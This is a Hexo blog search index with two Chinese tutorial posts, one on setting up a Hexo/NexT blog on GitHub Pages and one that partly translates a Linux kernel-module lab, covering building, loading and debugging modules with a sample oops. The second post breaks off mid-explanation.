<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Create a Blog with Hexo</title>
    <url>/2023/10/17/Create-a-Blog-with-Hexo/</url>
    <content><![CDATA[<p><code>Windows</code>下使用 <code>Hexo</code> 和 <code>github pages</code> 快速构建个人博客，</p>
<p>并针对<code>next</code>主题进行如下配置：修改语言、切换小主题、添加分类标签、文章折叠、本地搜索等。</p>
<span id="more"></span>

<h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><ul>
<li><p><a href="https://nodejs.org/en">nodejs</a></p>
</li>
<li><p><a href="https://git-scm.com/download/win">git</a></p>
</li>
</ul>
<p>从官网下载并安装好 <code>nodejs</code> 和 <code>git</code>。</p>
<p>执行以下命令，若返回版本号，则表明安装成功。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">node <span class="literal">--version</span></span><br><span class="line">git <span class="literal">--version</span></span><br></pre></td></tr></table></figure>

<h2 id="github仓库"><a href="#github仓库" class="headerlink" title="github仓库"></a>github仓库</h2><p>仓库名最好为 <code>用户名.github.io</code>，这样访问网站时用的<code>URL</code>是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名.github.io</span><br></pre></td></tr></table></figure>

<p>不然得使用以下域名进行访问</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">用户名.github.io/仓库名</span><br></pre></td></tr></table></figure>

<h2 id="设置ssh"><a href="#设置ssh" class="headerlink" title="设置ssh"></a>设置ssh</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh<span class="literal">-keygen</span> <span class="literal">-t</span> rsa <span class="literal">-C</span> <span class="string">&quot;xxx@qq.com&quot;</span></span><br></pre></td></tr></table></figure>

<p>将本地<code>id_rsa.pub</code>的内容，拷贝到github设置中的<code>SSH and GPG keys</code>。</p>
<h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm install <span class="literal">-g</span> hexo<span class="literal">-cli</span></span><br></pre></td></tr></table></figure>

<p>新建并初始化一个目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir blog</span><br><span class="line">hexo init blog    # 初始化</span><br><span class="line">cd blog</span><br><span class="line">npm install    # 安装组件</span><br></pre></td></tr></table></figure>

<p>本地预览：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">hexo g    <span class="comment"># 生成页面</span></span><br><span class="line">hexo s    <span class="comment"># 启动预览</span></span><br><span class="line"><span class="comment"># 若预览端口(4000)被占用，可使用hexo server -p 5000来更改端口号</span></span><br><span class="line"><span class="comment"># 页面是热更新的，更改 md 文件后刷新页面，就能看到修改后的内容</span></span><br></pre></td></tr></table></figure>

<p>本地博客测试成功后，将其上传到github部署</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装hexo-deployer-git</span></span><br><span class="line">npm install hexo-deployer-git --save </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改_config.yml文件末尾的Deployment部分为</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:用户名/用户名.github.io.git</span><br><span class="line">  branch: main</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用如下命令上传到github，就可以使用https://用户名.github.io进行访问</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<h2 id="新建博文"><a href="#新建博文" class="headerlink" title="新建博文"></a>新建博文</h2><h3 id="自动创建"><a href="#自动创建" class="headerlink" title="自动创建"></a>自动创建</h3><p>进入博客所在目录，执行以下命令创建博文，在source&#x2F;_posts目录下能看到一个My-New-Post.md文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new &quot;My New Post&quot;</span><br></pre></td></tr></table></figure>

<h3 id="手动创建"><a href="#手动创建" class="headerlink" title="手动创建"></a>手动创建</h3><p>在source&#x2F;_posts目录下新建一个md文件，并在文件开头加入如下格式的front-matter</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World # 标题</span><br><span class="line">date: 2019/3/26 hh:mm:ss # 时间</span><br><span class="line">categories: # 分类</span><br><span class="line"><span class="bullet">-</span> Diary</span><br><span class="line">tags: # 标签</span><br><span class="line"><span class="bullet">-</span> PS3</span><br><span class="line"><span class="section">- Games</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line"></span><br><span class="line">摘要</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">正文</span><br></pre></td></tr></table></figure>

<h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p><a href="https://hexo.io/themes/">hexo themes</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd blog</span><br><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br><span class="line">npm install --save hexo-renderer-pug    # 安装依赖</span><br></pre></td></tr></table></figure>

<h2 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a>配置主题</h2><p>在根目录创建 <code>_config.next.yaml</code> 文件，并将<code>themes\next\_config.yaml</code>文件的内容复制到里面，现在共两个配置文件</p>
<ul>
<li><code>_config.yaml</code> : Hexo站点配置</li>
<li><code>_config.[主题名].yaml</code> 这里以 <code>_config.next.yaml</code> 为例 ： 主题配置</li>
</ul>
<h3 id="站点配置"><a href="#站点配置" class="headerlink" title="站点配置"></a>站点配置</h3><p>打开站点配置文件</p>
<h4 id="修改语言"><a href="#修改语言" class="headerlink" title="修改语言"></a>修改语言</h4><p>搜索 <code>language</code>，找到如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">author:</span><br><span class="line">language:</span><br><span class="line">timezone:</span><br></pre></td></tr></table></figure>

<p>在 language 后面输入 <strong>zh-CN</strong>，并修改作者名</p>
<h3 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><p>打开主题配置文件</p>
<h3 id="开启分类和标签"><a href="#开启分类和标签" class="headerlink" title="开启分类和标签"></a>开启分类和标签</h3><p>搜索 <code>menu</code>，找到如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line">  about: /about/ || fa fa-user</span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line">  #schedule: /schedule/ || fa fa-calendar</span><br><span class="line">  #sitemap: /sitemap.xml || fa fa-sitemap</span><br><span class="line">  #commonweal: /404/ || fa fa-heartbeat</span><br></pre></td></tr></table></figure>

<p>执行以下命令，会在<code>source/</code>目录下分别创建<code>about</code> <code>tags</code> 和 <code>categories</code>目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page about</span><br><span class="line">hexo new page tags</span><br><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure>

<p>分别修改以上三个目录中的<code>index.md</code>文件，添加以下语句，以标明各自用途</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">type: &quot;about&quot;</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">type: &quot;categories&quot;</span><br></pre></td></tr></table></figure>

<p>之后就可以在文章的头部添加 <code>tags</code> 和 <code>categories</code>，<code>hexo</code>会自动进行识别，比如：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: Create a Blog with Hexo</span><br><span class="line">date: 2023-10-17 16:17:38</span><br><span class="line">tags:</span><br><span class="line"><span class="bullet">-</span> blog</span><br><span class="line"><span class="bullet">-</span> hexo</span><br><span class="line"><span class="bullet">-</span> next</span><br><span class="line">categories: 其它</span><br></pre></td></tr></table></figure>

<h4 id="切换小主题"><a href="#切换小主题" class="headerlink" title="切换小主题"></a>切换小主题</h4><p>next 主题自带<strong>四种样式</strong></p>
<p>搜索<code>Schemes</code>，选择喜欢的样式，取消对应行前的注释</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes</span></span><br><span class="line"><span class="comment"># scheme: Muse</span></span><br><span class="line"><span class="comment"># scheme: Mist</span></span><br><span class="line"><span class="comment"># scheme: Pisces</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Gemini</span></span><br></pre></td></tr></table></figure>

<h4 id="隐藏驱动提示"><a href="#隐藏驱动提示" class="headerlink" title="隐藏驱动提示"></a>隐藏驱动提示</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Powered by Hexo &amp; NexT</span></span><br><span class="line"><span class="attr">powered:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h4 id="首页文章折叠"><a href="#首页文章折叠" class="headerlink" title="首页文章折叠"></a>首页文章折叠</h4><p>在文章中想要结束预览的位置，添加以下标签：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="功能强化"><a href="#功能强化" class="headerlink" title="功能强化"></a>功能强化</h2><h3 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h3><p>安装插件<code>hexo-generator-searchdb</code>，命令如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-generator-searchdb</span><br></pre></td></tr></table></figure>

<p>在站点配置文件 <code>_config.yaml</code> 文件中增加以下内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>

<p>在主题配置文件 <code>_config.next.yaml</code> 中启用本地搜索功能：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>





<p>参考链接</p>
<ul>
<li><p><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面(两万字)-CSDN博客</a></p>
</li>
<li><p><a href="https://blog.guaoxiaohei.me/posts/Hexo-Level/">Hexo NexT文章中标题自动编号 | 孤傲小黑的博客 (guaoxiaohei.me)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>Create a Linux Kernel Module</title>
    <url>/2023/10/17/Create-a-Linux-Kernel-Module/</url>
    <content><![CDATA[<p>创建一个 <code>Linux</code> 内核模块，为 <code>kernel PWN</code> 的学习补充一些基础知识。</p>
<p>英文原文链接：</p>
<ul>
<li><a href="https://linux-kernel-labs.github.io/refs/heads/master/labs/kernel_modules.html">Kernel modules — The Linux Kernel documentation (linux-kernel-labs.github.io)</a></li>
</ul>
<p>代码带库：</p>
<ul>
<li><a href="https://github.com/linux-kernel-labs/linux">linux-kernel-labs&#x2F;linux: Linux kernel source tree (github.com)</a></li>
</ul>
<span id="more"></span>

<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><h2 id="内核模块概述"><a href="#内核模块概述" class="headerlink" title="内核模块概述"></a>内核模块概述</h2><p>宏内核虽然比微内核要快，但模块化不足，可扩展性低。在现代宏内核中，通过引入内核模块机制，这个问题被很好地解决了。一个内核模块（或者叫可加载内核层）是一个包含可执行指令的对象文件，在需要时被加载，从而达到在运行时扩展内核功能的目的。当不再需要这个内核模块时，可以把它卸载掉。大部分设备驱动以内核模块的形式被使用。</p>
<p>对于<code>Linux</code>设备驱动的开发，一般建议既下载内核源码、配置并编译，同时下载编译好的版本，以便进行测试和开发。</p>
<h2 id="内核模块示例"><a href="#内核模块示例" class="headerlink" title="内核模块示例"></a>内核模块示例</h2><p>下面是一个非常简单的内核模块示例。当被加载到内核中时，它会生成一个消息 “HI”，当被从卸载时，会生成一个消息 “Bye”。</p>
<blockquote>
<p>译者注：模块文件名称不能是 module，本文使用 modul</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;My kernel module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Me&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">dummy_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(<span class="string">&quot;Hi\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">dummy_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(<span class="string">&quot;Bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(dummy_init);</span><br><span class="line">module_exit(dummy_exit);</span><br></pre></td></tr></table></figure>

<p>生成的消息不会在终端中展示，而是会被保存到一个特殊的内存区域，我们可以使用日志守护进程 <code>syslog</code> 获取它们。为了展示内核消息，可以使用 <code>dmesg</code> 命令或者查看系统日志。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dmesg | <span class="built_in">tail</span> -2</span></span><br><span class="line">Hi</span><br><span class="line">Bye</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /var/log/syslog | <span class="built_in">tail</span> -2</span></span><br><span class="line">Feb 20 13:57:38 asgard kernel: Hi</span><br><span class="line">Feb 20 13:57:43 asgard kernel: Bye</span><br></pre></td></tr></table></figure>

<h2 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h2><p>编译内核模块和编译用户程序有所不同。首先，要使用一些不同的头文件，且模块不应该链接到任何的库。同时，不能不提的是，模块编译选项必须和目标内核编译时用的选项保持一致。出于这些原因，我们可以使用一个标准的内核模块编译方法（kbuild）。这种方法使用到两个文件：一个 <code>Makefile</code> 和一个 <code>Kbuild</code> 文件。</p>
<p>下面是一个 <code>Makefile</code> 的示例：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">KDIR = /lib/modules/`uname -r`/build</span><br><span class="line"><span class="comment"># 译者注：这样得到的内核源码目录不一定正确，还需根据实际情况进行调整</span></span><br><span class="line"></span><br><span class="line"><span class="section">kbuild:</span></span><br><span class="line">        make -C <span class="variable">$(KDIR)</span> M=`pwd`</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        make -C <span class="variable">$(KDIR)</span> M=`pwd` clean</span><br></pre></td></tr></table></figure>

<p>一个 <code>Kbuild</code> 示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EXTRA_CFLAGS = -Wall -g</span><br><span class="line"></span><br><span class="line">obj-m        = modul.o</span><br></pre></td></tr></table></figure>

<p>正如所见，对 <code>Makefile</code> 调用 <code>make</code>会导致在内核源码目录（KDIR）中调用 <code>make</code>，并引用当前目录（M&#x3D;<code>pwd</code>）。这个过程最终导致从当前目录中读取 <code>Kbuild</code> 文件，并按照该文件中的指示编译模块。</p>
<blockquote>
<p>Note.</p>
<p>当使用从其他地方下载来的Linux源码，而不是本机源码时，需调整 KDIR 至对应内核源码目录。</p>
<p>如：KDIR &#x3D; &#x2F;home&#x2F;student&#x2F;src&#x2F;linux</p>
</blockquote>
<p><code>Kbuild</code> 文件中包含一条或多条用于编译内核模块的指令，最简单的指令示例如：obj-m &#x3D; module.o  根据这条指令，一个内核模块（内核对象ko - kernel object），会从 <code>module.o</code>文件开始创建。<code>module.o</code> 会从 <code>module.c</code> 或 <code>module.S</code> 文件中读取。这些文件都应能在 <code>Kbuild</code> 所在目录中找到。</p>
<p>一个使用多个子模块的 <code>Kbuild</code> 文件示例如下：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">EXTRA_CFLAGS = -Wall -g</span><br><span class="line"></span><br><span class="line">obj-m = supermodule.o</span><br><span class="line">supermodule-y = module-a.o module-b.o</span><br></pre></td></tr></table></figure>

<p>对于上面的示例，编译步骤如下：</p>
<ul>
<li>编译 <code>module-a.c</code> 和 <code>module-b.c</code> 源码文件，得到 <code>module-a.c</code> 和 <code>module-b.o</code> 对象文件</li>
<li>将 <code>module-a.c</code> 和 <code>module-b.o</code> 链接成 <code>supermodule.o</code></li>
<li>最后从 <code>supermodule.o</code> 可以创建 <code>supermodule.ko</code> 模块</li>
</ul>
<p><code>Kbuild</code> 中目标名称的后缀，决定了它们会被如何使用，规则如下：</p>
<ul>
<li><p>M（module）指可加载内核模块目标</p>
</li>
<li><p>Y（yes）表示一个编译得到的，且还会被链接到内核模块（$(module_name)-y）或链接进内核（obj-y）的对象目标</p>
</li>
<li><p>所有其它的目标名称后缀。都会被 <code>Kbuild</code>忽略，且对应文件不会被编译。</p>
</li>
</ul>
<blockquote>
<p>Note.</p>
<p>这些后缀可以方便使用<code>make menuconfig</code>命令或直接编辑<code>.config</code>文件配置内核。<code>.config</code>文件设置了一系列变量，用于确定在构建时将哪些功能添加到内核中。</p>
<p>例如，当使用<code>make menuconfig</code>添加<code>BTRFS</code>支持时，会将<code>CONFIG BTRFS FS=y</code>行添加到<code>.config</code>文件中。原本<code>BTRFS kbuild</code>包含行<code>obj-$（CONFIG BTRFS FS）：=BTRFS.o</code>，现在该行会变为<code>obj-y：=BTRFS.</code>o。这将编译<code>BTRFS.0</code>对象并将其链接到内核。在设置变量之前，该行变为<code>obj:=btrfs.o</code>，因此它被忽略，构建得到的内核也就不支持<code>BTRFS </code>。</p>
</blockquote>
<h2 id="内核模块的加载和卸载"><a href="#内核模块的加载和卸载" class="headerlink" title="内核模块的加载和卸载"></a>内核模块的加载和卸载</h2><p>加载模块使用<code>insmod</code>命令，接收内核模块路径作参数；卸载模块使用<code>rmmod</code>命令，使用模块名称作为参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">insmod modul.ko</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rmmod modul.ko</span></span><br></pre></td></tr></table></figure>

<p>加载内核模块时，会执行被指定为<code>module_init</code>宏参数的例程。类似地，当卸载模块时，会执行被指定为<code>module_exit</code>宏参数的例程。</p>
<p>一个内核模块完整的编译、加载、卸载的过程如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">faust:~/lab-01/modul-lin# ls</span><br><span class="line">Kbuild  Makefile  modul.c</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# make</span><br><span class="line">make -C /lib/modules/`uname -r`/build M=`pwd`</span><br><span class="line">make[1]: Entering directory `/usr/src/linux-2.6.28.4&#x27;</span><br><span class="line">  LD      /root/lab-01/modul-lin/built-in.o</span><br><span class="line">  CC [M]  /root/lab-01/modul-lin/modul.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /root/lab-01/modul-lin/modul.mod.o</span><br><span class="line">  LD [M]  /root/lab-01/modul-lin/modul.ko</span><br><span class="line">make[1]: Leaving directory `/usr/src/linux-2.6.28.4&#x27;</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# ls</span><br><span class="line">built-in.o  Kbuild  Makefile  modul.c  Module.markers</span><br><span class="line">modules.order  Module.symvers  modul.ko  modul.mod.c</span><br><span class="line">modul.mod.o  modul.o</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# insmod modul.ko</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# dmesg | tail -1</span><br><span class="line">Hi</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# rmmod modul</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# dmesg | tail -2</span><br><span class="line">Hi</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>

<p>已加载模块的信息，可以通过<code>lsmod</code>命令进行查看，也可以通过 <code>/proc/modules</code>文件 和 <code>/sys/module</code>目录进行查看。</p>
<h2 id="内核模块调试"><a href="#内核模块调试" class="headerlink" title="内核模块调试"></a>内核模块调试</h2><p>对内核模块进行故障排除比调试常规程序要复杂得多。首先，内核模块中的错误可能导致整个系统阻塞，因此故障排除也就慢很多。为了避免重启，推荐使用虚拟机（如qemu，virtualbox，vmware等）。</p>
<p>当一个包含<code>bug</code>的内核模块被加载到内核中时，最终会生成一个内核<code>oops</code>。内核<code>oops</code>是内核检测到的无效操作，只能由内核产生。对于稳定的内核版本，<code>oops</code>的产生几乎可以肯定地意味着内核模块中存在<code>bug</code>。在<code>oops</code>出现后，内核会继续工作。</p>
<p>保存<code>oops</code>出现时内核发出的消息是很重要的，和上面提到的一样，内核产生的消息被保存到日志中，能够使用<code>dmesg</code>命令进行展示。为了不丢失任何的内核消息，推荐直接从控制台终端插入&#x2F;测试内核模块，或者定期查看内核消息。值得注意的是，<code>oops</code>的产生既可能是因为一个编程错误，也可能是因为一个错误。</p>
<p>如果出现一个致命的错误，导致系统无法返回到一个稳定态，会产生一个内核<code>panic</code>。</p>
<p>下面是一个包含bug，会产生<code>oops</code>的内核模块源码示例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Oops generating kernel module</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION (<span class="string">&quot;Oops&quot;</span>);</span><br><span class="line">MODULE_LICENSE (<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR (<span class="string">&quot;PSO&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_READ         0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_WRITE        1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_OOPS         OP_WRITE</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_oops_init</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> *a;</span><br><span class="line"></span><br><span class="line">        a = (<span class="type">int</span> *) <span class="number">0x00001234</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OP_OOPS == OP_WRITE</span></span><br><span class="line">        *a = <span class="number">3</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> OP_OOPS == OP_READ</span></span><br><span class="line">        printk (KERN_ALERT <span class="string">&quot;value = %d\n&quot;</span>, *a);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unknown op for oops!&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_oops_exit</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init (my_oops_init);</span><br><span class="line">module_exit (my_oops_exit);</span><br></pre></td></tr></table></figure>

<p>将这个模块插入到内核中时，会产生一个<code>oops</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">faust:~/lab<span class="number">-01</span>/modul-oops<span class="meta"># insmod oops.ko</span></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">faust:~/lab<span class="number">-01</span>/modul-oops<span class="meta"># dmesg | tail -32</span></span><br><span class="line">BUG: unable to handle kernel paging request at <span class="number">00001234</span></span><br><span class="line">IP: [&lt;c89d4005&gt;] my_oops_init+<span class="number">0x5</span>/<span class="number">0x20</span> [oops]</span><br><span class="line">  *de = <span class="number">00000000</span></span><br><span class="line">Oops: <span class="number">0002</span> [#<span class="number">1</span>] PREEMPT DEBUG_PAGEALLOC</span><br><span class="line">last sysfs file: /sys/devices/virtual/net/lo/operstate</span><br><span class="line">Modules linked in: oops(+) netconsole ide_cd_mod pcnet32 crc32 cdrom [last unloaded: modul]</span><br><span class="line"></span><br><span class="line">Pid: <span class="number">4157</span>, comm: insmod Not tainted (<span class="number">2.6</span><span class="number">.28</span><span class="number">.4</span> #<span class="number">2</span>) VMware Virtual Platform</span><br><span class="line">EIP: <span class="number">0060</span>:[&lt;c89d4005&gt;] EFLAGS: <span class="number">00010246</span> CPU: <span class="number">0</span></span><br><span class="line">EIP is at my_oops_init+<span class="number">0x5</span>/<span class="number">0x20</span> [oops]</span><br><span class="line">EAX: <span class="number">00000000</span> EBX: fffffffc ECX: c89d4300 EDX: <span class="number">00000001</span></span><br><span class="line">ESI: c89d4000 EDI: <span class="number">00000000</span> EBP: c5799e24 ESP: c5799e24</span><br><span class="line"> DS: <span class="number">007b</span> ES: <span class="number">007b</span> FS: <span class="number">0000</span> GS: <span class="number">0033</span> SS: <span class="number">0068</span></span><br><span class="line">Process insmod (pid: <span class="number">4157</span>, ti=c5799000 task=c665c780 task.ti=c5799000)</span><br><span class="line">Stack:</span><br><span class="line"> c5799f8c c010102d c72b51d8 <span class="number">0000000</span>c c5799e58 c01708e4 <span class="number">00000124</span> <span class="number">00000000</span></span><br><span class="line"> c89d4300 c5799e58 c724f448 <span class="number">00000001</span> c89d4300 c5799e60 c0170981 c5799f8c</span><br><span class="line"> c014b698 <span class="number">00000000</span> <span class="number">00000000</span> c5799f78 c5799f20 <span class="number">00000500</span> c665cb00 c89d4300</span><br><span class="line">Call Trace:</span><br><span class="line"> [&lt;c010102d&gt;] ? _stext+<span class="number">0x2d</span>/<span class="number">0x170</span></span><br><span class="line"> [&lt;c01708e4&gt;] ? __vunmap+<span class="number">0xa4</span>/<span class="number">0xf0</span></span><br><span class="line"> [&lt;c0170981&gt;] ? vfree+<span class="number">0x21</span>/<span class="number">0x30</span></span><br><span class="line"> [&lt;c014b698&gt;] ? load_module+<span class="number">0x19b8</span>/<span class="number">0x1a40</span></span><br><span class="line"> [&lt;c035e965&gt;] ? __mutex_unlock_slowpath+<span class="number">0xd5</span>/<span class="number">0x140</span></span><br><span class="line"> [&lt;c0140da6&gt;] ? trace_hardirqs_on_caller+<span class="number">0x106</span>/<span class="number">0x150</span></span><br><span class="line"> [&lt;c014b7aa&gt;] ? sys_init_module+<span class="number">0x8a</span>/<span class="number">0x1b0</span></span><br><span class="line"> [&lt;c0140da6&gt;] ? trace_hardirqs_on_caller+<span class="number">0x106</span>/<span class="number">0x150</span></span><br><span class="line"> [&lt;c0240a08&gt;] ? trace_hardirqs_on_thunk+<span class="number">0xc</span>/<span class="number">0x10</span></span><br><span class="line"> [&lt;c0103407&gt;] ? sysenter_do_call+<span class="number">0x12</span>/<span class="number">0x43</span></span><br><span class="line">Code: &lt;c7&gt; <span class="number">05</span> <span class="number">34</span> <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">5</span>d c3 eb <span class="number">0</span>d <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line">EIP: [&lt;c89d4005&gt;] my_oops_init+<span class="number">0x5</span>/<span class="number">0x20</span> [oops] SS:ESP <span class="number">0068</span>:c5799e24</span><br><span class="line">---[ end trace <span class="number">2981</span>ce73ae801363 ]---</span><br></pre></td></tr></table></figure>

<p>尽管相对神秘，内核给出的消息提供了出现<code>oops</code>错误的重要信息。第一行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BUG: unable to handle kernel paging request at 00001234</span><br><span class="line">EIP: [&lt;c89d4005&gt;] my_oops_init + 0x5 / 0x20 [oops]</span><br></pre></td></tr></table></figure>

<p>告诉我们产生错误的原因，和造成错误的指令的地址。本例中，这是一个无效内存地址获取。</p>
<p>下一行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Oops: 0002 [# 1] PREEMPT DEBUG_PAGEALLOC</span><br></pre></td></tr></table></figure>

